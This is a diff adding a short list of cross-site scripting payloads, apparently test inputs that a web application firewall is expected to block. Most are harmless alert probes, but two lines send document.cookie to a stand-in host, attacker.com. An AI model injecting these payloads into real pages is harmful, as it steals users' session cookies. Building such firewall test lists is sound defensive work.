@@ -1,0 +1,14 @@
+# XSS payloads — should all be blocked by the WAF at PL1.
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+"><script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:void(0)" onclick="alert(1)">click</a>
+'"><img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
+<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>
+<input type="text" value="" onfocus="alert(1)" autofocus>
+<details open ontoggle=alert(1)>
